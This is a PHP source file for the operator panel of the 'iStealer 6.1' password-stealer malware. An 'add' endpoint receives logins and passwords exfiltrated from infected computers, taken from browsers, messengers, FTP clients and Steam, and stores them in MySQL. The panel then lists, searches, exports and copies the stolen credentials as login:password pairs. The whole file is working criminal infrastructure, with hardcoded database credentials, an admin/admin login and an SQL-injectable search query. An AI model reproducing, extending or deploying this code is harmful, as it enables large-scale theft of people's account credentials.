<?php
	// CONFIGURATION ******************************************************************************

   $dbHost     = "127.0.0.1";		// MySQL host
   $dbUser     = "sbk";	// MySQL username
   $dbPass     = "19061995";	// MySQL password
   $dbDatabase = "vensart";	// MySQL database name
	
   $username   = "admin";		// Login Username
   $password   = "admin";		// Login Password
   
   $logspage   = 50;			// Number of logs per page
	
	// ********************************************************************************************

	$html       = "<html><head><title>iStealer 6.1 Legends Log manager - ";
	$header     = "</title><link rel='stylesheet' type='text/css' href='style.css'/></head><body>
				<div id='web'><div id='header'><b>Hello, ".$username."</b></div><div id='navigation'><ul>
				<li><a href='?action=logs'>Show All Logs</a></li><li><a href='?action=search'>Search</a></li>
				<li><a href='?action=exportall'>Export All Logs</a></li>
				<li><a href='?action=logout'>Logout</a></li></ul></div><br>";
	$footer     = "<div id='footer'>iStealer 6.1 Legends - Kizar Labs 2009</div></div></body></html>";
	$searchform = "<form name='search' method='POST' action='?action=search'>
				Search for: <input type='text' name='q' size='20'> In: <select name='in'>
				<option selected='selected' value='1'>Url</option><option value='2'>Login</option>
				<option value='3'>Password</option><option value='4'>Computer</option>
				<option value='5'>Date</option><option value='6'>Ip</option></select>
				<input type='submit' value='Search' name='search'></form>";
	$loginform  = "<form id='loginform' name='frm' method='POST' action='?action=login'>
				<table id='logintable' cellpadding='0' cellspacing='10' border='0'>
				<tr><td>Username:</td><td><input type='text' name='username' size='20'></td></tr>
				<tr><td>Password:</td><td><input type='password' name='password' size='20'></td></tr>
				<tr><td></td><td><input type='submit' value='Login' name='login'></td></tr></form>";
	$javascript  = "<script language='javascript' type='text/javascript'>
				function checkAll() { chk = document.getElementsByName('sel[]');
				for (i = 0; i<chk.length; i++) { if (document.frm.elements['check_all'].checked) chk[i].checked = true; else chk[i].checked = false;}}
				function checkform() { chk = document.getElementsByName('sel[]'); for (i = 0; i<chk.length; i++) { if (chk[i].checked == true) { 
				return true;}} alert('At least one option must be select.'); return false; }
				function confirmation() { return confirm('Are you sure you want to delete all selected logs?');}</script>";
	$aplications = array("MSN Messenger", "Google talk", "Trillian/MSN", "Trillian/AIM", "Trillian/Yahoo", "Pidgin/Gaim", "Paltalk Scene", "Steam",
					"No-Ip" , "DynDNS", "Firefox", "Internet Explorer", "Google Chrome", "Opera", "IDM", "FileZilla", "FlashFXP", "SmartFtp", "CuteFtp");
	$cols        = array("program", "url", "login", "pass", "computer", "date", "ip");

	// FUNCTIONS ******************************************************************************
	function connect_database() {
		global $dbHost, $dbUser, $dbPass, $dbDatabase, $html, $header, $footer;
		$mysql = mysql_connect($dbHost, $dbUser, $dbPass);
		if (!$mysql) {
			$html .= "Database Error".$header."Can not connect to database, please check the configuration.".$footer;
			die($html);
		}
		if (!mysql_select_db($dbDatabase, $mysql)) {
			mysql_close($mysql);
			$html .= "Database Error".$header."Can not select '".$dbDatabase."' database, please check the configuration.".$footer;
			die($html);
		}
		return $mysql;
	}
	function pages_number($logstotal, $logspage) {
		$pagesnumber = ceil($logstotal/$logspage);
		$temp = "Pages: ";
		for ($i=0; $i<$pagesnumber; $i++) {
			if ($_SESSION["page"] == $i)
				$temp .= " <span class='page1'>".$i."</span>";
			else
				$temp .= " <span class='page0'><a href='?action=logs&page=".$i."'>".$i."</a></span>";
		}
		$temp .= " Results ".($_SESSION["page"]*$logspage)." - ".(($_SESSION["page"]*$logspage)+$logspage)." of about ".$logstotal;
		return $temp;
	}
	function sort_order() {
		if ($_SESSION["order"] == 0) $tmp = "ASC"; else $tmp = "DESC";
			return $tmp;
	}

	// TEST *************************************************************************************
	if ($_GET["action"] == "test") {
		$mysql = connect_database();
		$result = mysql_query("SELECT COUNT(*) FROM `logs`;", $mysql);
		if ($result) {
			echo "Ready";
		} else {
			echo "NoReady";
		}
		mysql_close($mysql);
		exit;
	}

	// ADD ***************************************************************************************
	if ($_GET["action"] == "add") {
		if (isset($_GET["a"]) && isset($_GET["c"]) && isset($_GET["u"]) && isset($_GET["l"])&& isset($_GET["p"]) 
		&& is_numeric($_GET["a"]) && $_GET["a"]>=0 && $_GET["a"]<=18 && strlen($_GET["p"])>3) {
			$mysql = mysql_connect($dbHost, $dbUser, $dbPass);
			if (!$mysql) exit;
			if (!mysql_select_db($dbDatabase, $mysql)) exit;
			$result = mysql_query("SELECT * FROM `logs` WHERE `program` = '".$_GET["a"]."' AND `url` = '".mysql_real_escape_string(htmlspecialchars(urldecode($_GET["u"])), $mysql).
			"' AND `login` = '".mysql_real_escape_string(htmlspecialchars(urldecode($_GET["l"])), $mysql)."' AND `pass` = '".
			mysql_real_escape_string(htmlspecialchars(urldecode($_GET["p"])), $mysql)."';", $mysql);
			if (!$result) exit;
			if (mysql_num_rows($result) == 0) {
				$result = mysql_query("INSERT INTO `logs` (`id`, `program`, `url`, `login`, `pass`, `computer`, `date`, `ip`) VALUES (NULL , '".
				$_GET["a"]."', '".mysql_real_escape_string(htmlspecialchars(urldecode($_GET["u"])), $mysql)."', '".
				mysql_real_escape_string(htmlspecialchars(urldecode($_GET["l"])), $mysql)."', '".mysql_real_escape_string(htmlspecialchars(urldecode($_GET["p"])), $mysql)."', '".
				mysql_real_escape_string(htmlspecialchars(urldecode($_GET["c"])), $mysql)."', '".date("Y-m-d H:i:s")."', '".$_SERVER['REMOTE_ADDR']."');", $mysql);
			}
			mysql_close($mysql);
		}
		exit;
	}

	// LOGIN **************************************************************************************
	session_start();
	if ($_SESSION["user"]!=$username || $_SESSION["ip"]!=$_SERVER["REMOTE_ADDR"]) {
		if ($_GET["action"] == "login") {
			if (isset($_POST["username"]) && isset($_POST["password"]) && $username==$_POST["username"] && $password==$_POST["password"]) {
				session_start();
				$_SESSION["user"] = $username;
				$_SESSION["ip"] = $_SERVER["REMOTE_ADDR"];
				$_SESSION["sort"] = 5;
				$_SESSION["order"] = 1;
				$_SESSION["page"] = 0;
				
				$mysql = connect_database();
				$result = mysql_query("SELECT COUNT(*) FROM `logs`;", $mysql);
				if (!$result) {
					$result = mysql_query("CREATE TABLE `logs` (`id` INT NOT NULL AUTO_INCREMENT PRIMARY KEY, `program` INT NOT NULL, `url` 
								VARCHAR(150) NOT NULL, `login` VARCHAR(50) NOT NULL, `pass` VARCHAR(50) NOT NULL, `computer` VARCHAR(50) NOT NULL, `date` 
								DATETIME NOT NULL, `ip` VARCHAR(15) NOT NULL);", $mysql);
					if (!$result) {
						$html .= "Database Error".$header."Can not create table 'logs', please check the configuration and your priviledges.".$footer;
						die($html);
					}
				}
				mysql_close($mysql);
				header("Location: ?action=logs");
			} else {
				$html = "<html><head><title>Login Error</title><link rel='stylesheet' type='text/css' href='style.css'/></head><body>".$loginform."</body></html>";
				echo $html;
				exit;
			}
		} else {
			$html = "<html><head><title>Login</title><link rel='stylesheet' type='text/css' href='style.css'/></head><body>".$loginform."</body></html>";
			echo $html;
			exit;
		}
	}

	// LOGOUT ************************************************************************************
	if ($_GET["action"] == "logout") {
		unset($_SESSION["user"]);
		unset($_SESSION["ip"]);
		unset($_SESSION["sort"]);
		unset($_SESSION["order"]);
		unset($_SESSION["page"]);
		session_unset();
		header("Location: index.php");

	// LOGS **************************************************************************************
	} elseif ($_GET["action"] == "logs" || !isset($_GET["action"])) {
	
		if (isset($_GET["sort"]) && $_GET["sort"]>=0 && $_GET["sort"]<=6) {
			if ($_SESSION["sort"] == $_GET["sort"])
				if ($_SESSION["order"] == 0) $_SESSION["order"] = 1; else $_SESSION["order"] = 0; else $_SESSION["sort"] = $_GET["sort"];
		}

		$mysql = connect_database();
		$result = mysql_query("SELECT COUNT(*) FROM `logs`;", $mysql);
		$logstotal = mysql_result($result, 0);
		if ($logstotal > 0) {
			if (isset($_GET["page"]) && is_numeric($_GET["page"]) && $_GET["page"]>=0 && $_GET["page"]<=ceil($logstotal/$logspage))
				$_SESSION["page"] = $_GET["page"];
			
			$result = mysql_query("SELECT * FROM `logs` ORDER BY `".$cols[$_SESSION["sort"]]."` ".sort_order()." LIMIT ".($logspage*$_SESSION["page"])." , ".$logspage.";", $mysql);
			if (!$result) die(mysql_error());
			
			$html .= "Logs".$header.$javascript."
					<form name='frm' method='POST' action='?action=selected' onsubmit='return checkform();'>
					<table id='logstable' cellpadding='2' cellspacing='0' border='0'><tr id='row0'>
					<td><a href='?action=logs&sort=0'>Program</a></td><td><a href='?action=logs&sort=1'>Url / Host</a></td>
					<td><a href='?action=logs&sort=2'>Login</a></td><td><a href='?action=logs&sort=3'>Password</a></td>
					<td><a href='?action=logs&sort=4'>Computer</a></td><td><a href='?action=logs&sort=5'>Date</a></td>
					<td><a href='?action=logs&sort=6'>Ip</a></td>
					<td><input type='checkbox' name='check_all' onClick='checkAll();'></td></tr>";
			$i = 0;
			while ($row = mysql_fetch_array($result)) {
				$html .= "<tr class='";
				if ($i % 2 == 0) $html .= "row1"; else $html .= "row2";
				$html .= "'><td>".$aplications[$row["program"]]."</td>";
				$html .= "<td><a href='".$row["url"]."' target='_blanc'>".$row["url"]."</a></td><td>".$row["login"]."</td><td>".$row["pass"]."</td>";
				$html .= "<td>".$row["computer"]."</td><td>".$row["date"]."</td><td>".$row["ip"]."</td>";
				$html .= "<td><input type='checkbox' name='sel[]' value='".$row["id"]."'></td></tr>";
				$i++;
			}
			$html .= "</table><div id='pages'><div id='numbers'>".pages_number($logstotal, $logspage)."</div><div id='buttons'><input name='buttonact' 
			type='submit' value='Copy Selected'> <input name='buttonact' type='submit' value='Export Selected'> <input name='buttonact' type='submit' 
			value='Delete Selected' onclick='if (!confirmation()) return false;'></div></div></form>".$footer;
		} else {
			$html .= "Logs".$header."No logs found!".$footer;
		}
		mysql_close($mysql);
		echo $html;

	// SEARCH ************************************************************************************
	} elseif ($_GET["action"] == "search") {
		if (isset($_POST["q"]) && isset($_POST["in"]) && is_numeric($_POST["in"]) && $_POST["in"]>0 && $_POST["in"]<=6) {
			$mysql = connect_database();
			$result = mysql_query("SELECT * FROM `logs` WHERE `".$cols[$_POST["in"]]."` LIKE '%".$_POST["q"]."%';", $mysql);
			if (!$result) die(mysql_error());
			
			if (mysql_num_rows($result) > 0) {
				$html .= "Search".$header.$javascript.$searchform."
					<form name='frm' method='POST' action='?action=selected' onsubmit='return checkform();'>
					<table id='searchtable' cellpadding='2' cellspacing='0' border='0'><tr id='row0'>
					<td>Program</td><td>Url / Host</td>
					<td>Login</td><td>Password</td>
					<td>Computer</td><td>Date</td>
					<td>Ip</td>
					<td><input type='checkbox' name='check_all' onClick='checkAll();'></td></tr>";
				$i = 0;
				while ($row = mysql_fetch_array($result)) {
					$html .= "<tr class='";
					if ($i % 2 == 0) $html .= "row1"; else $html .= "row2";
					$html .= "'><td>".$aplications[$row["program"]]."</td>";
					$html .= "<td><a href='".$row["url"]."' target='_blanc'>".$row["url"]."</a></td><td>".$row["login"]."</td><td>".$row["pass"]."</td>";
					$html .= "<td>".$row["computer"]."</td><td>".$row["date"]."</td><td>".$row["ip"]."</td>";
					$html .= "<td><input type='checkbox' name='sel[]' value='".$row["id"]."'></td></tr>";
					$i++;
				}
				$html .= "</table><div id='pages'><div id='numbers'>".mysql_num_rows($result)." results for '".$_POST["q"]."'</div><div id='buttons'>
				<input name='buttonact' type='submit' value='Copy Selected'> <input name='buttonact' type='submit' value='Export Selected'> 
				<input name='buttonact' type='submit' value='Delete Selected' onclick='if (!confirmation()) return false;'></div></div></form>".$footer;
			} else {
				$html .= "Search".$header.$searchform."<br>No results found!".$footer;
			}
			mysql_close($mysql);
		} else {
			$html .= "Search".$header.$searchform.$footer;
		}
		echo $html;
	
	// EXPORT ALL ************************************************************************************
	} elseif ($_GET["action"] == "exportall") {
		header("Content-Type: text/plain");
		header("Content-Disposition: Attachment; filename=iStealer_6.0_export.txt");
		header("Pragma: no-cache");
		
		$mysql = connect_database();
		$result = mysql_query("SELECT * FROM `logs`;", $mysql);
		if (!$result) die(mysql_error());
		
		while ($row = mysql_fetch_array($result)) {
			echo "Program:\t".$aplications[$row['program']]."\r\n";
			echo "Url/Host:\t".$row['url']."\r\n";
			echo "Login:\t\t".$row['login']."\r\n";
			echo "Password:\t".$row['pass']."\r\n";
			echo "Computer:\t".$row['computer']."\r\n";
			echo "Date:\t\t".$row['date']."\r\n";
			echo "Ip:\t\t\t".$row['ip']."\r\n";
			echo "----------------------------------------------------------\r\n";
		}
		mysql_close($mysql);
	
	// SELECTED **************************************************************************************
	} elseif ($_GET["action"] == "selected") {
		if (isset($_POST["buttonact"]) && isset($_POST["sel"]) && count($_POST["sel"])!=0) {

			// DELETE SELECTED ***********************************************************************
			if ($_POST["buttonact"] == "Delete Selected") {
				$mysql = connect_database();
				$query = "DELETE FROM `logs` WHERE";
				for ($i=0; $i<count($_POST["sel"]); $i++) {
					if (is_numeric($_POST["sel"][$i]))
						$query .= " `id` = ".$_POST["sel"][$i]." OR";
				}
				$query .= ';';
				$query = str_replace(' OR;', ';', $query);
				$result = mysql_query($query, $mysql);
				if (!$result) die(mysql_error());
				mysql_close($mysql);
				header("Location: ?action=logs");

			// EXPORT SELECTED ***********************************************************************
			} elseif ($_POST["buttonact"] == "Export Selected") {
				header("Content-Type: text/plain");
				header("Content-Disposition: Attachment; filename=iStealer_6.0_export.txt");
				header("Pragma: no-cache");
				$mysql = connect_database();
				$query = "SELECT * FROM `logs` WHERE";
				for ($i=0; $i<count($_POST["sel"]); $i++) {
					if (is_numeric($_POST["sel"][$i]))
						$query .= " `id` = ".$_POST["sel"][$i]." OR";
				}
				$query .= ';';
				$query = str_replace(' OR;', ';', $query);
				$result = mysql_query($query, $mysql);
				if (!$result) die(mysql_error());
				while ($row = mysql_fetch_array($result)) {
					echo "Program:\t".$aplications[$row['program']]."\r\n";
					echo "Url/Host:\t".$row['url']."\r\n";
					echo "Login:\t\t".$row['login']."\r\n";
					echo "Password:\t".$row['pass']."\r\n";
					echo "Computer:\t".$row['computer']."\r\n";
					echo "Date:\t\t".$row['date']."\r\n";
					echo "Ip:\t\t\t".$row['ip']."\r\n";
					echo "----------------------------------------------------------\r\n";
				}
				mysql_close($mysql);

			// COPY SELECTED *************************************************************************
			} elseif ($_POST["buttonact"] == "Copy Selected") {
				$mysql = connect_database();
				$query = "SELECT `login`, `pass` FROM `logs` WHERE";
				for ($i=0; $i<count($_POST["sel"]); $i++) {
					if (is_numeric($_POST["sel"][$i]))
						$query .= " `id` = ".$_POST["sel"][$i]." OR";
				}
				$query .= ';';
				$query = str_replace(' OR;', ';', $query);
				$result = mysql_query($query, $mysql);
				if (!$result) die(mysql_error());
				$html .= "Copy".$header."<table id='searchtable' cellpadding='2' cellspacing='0' border='0'><tr class='row1'><td>";
				while ($row = mysql_fetch_array($result))
					$html .= $row['login'].":".$row['pass']."<br>";
				mysql_close($mysql);
				$html .= "</td></tr></table><br>".$footer;
				echo $html;
			}
		}
	} else {
		$html .= "Unexpected Error".$header."Unexpected Error".$footer;
		echo $html;
	}
?>